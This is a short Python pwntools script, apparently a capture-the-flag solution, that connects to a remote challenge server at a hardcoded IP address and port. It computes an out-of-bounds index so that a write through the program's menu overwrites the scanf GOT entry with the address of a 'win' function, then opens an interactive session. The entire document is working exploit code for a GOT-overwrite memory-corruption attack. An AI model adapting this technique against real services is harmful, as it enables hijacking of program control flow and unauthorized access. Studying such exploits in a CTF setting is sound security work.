#!/usr/bin/env python3
from pwn import *

HOST = "103.127.98.249"
PORT = 5003

elf = ELF("./chall")

WIN = 0x401399
SCANF_GOT = elf.got["__isoc23_scanf"]

PROCESS_BASE = 0x4040a0
STRUCT_SIZE = 24
BURST_OFFSET = 8

INDEX = (SCANF_GOT - PROCESS_BASE - BURST_OFFSET) // STRUCT_SIZE

log.info(f"win        = {hex(WIN)}")
log.info(f"scanf GOT  = {hex(SCANF_GOT)}")
log.info(f"index      = {INDEX}")

io = remote(HOST, PORT)

io.sendlineafter(b">", b"1")
io.sendlineafter(b":", str(INDEX).encode())
io.sendlineafter(b":", str(WIN).encode())

io.interactive()
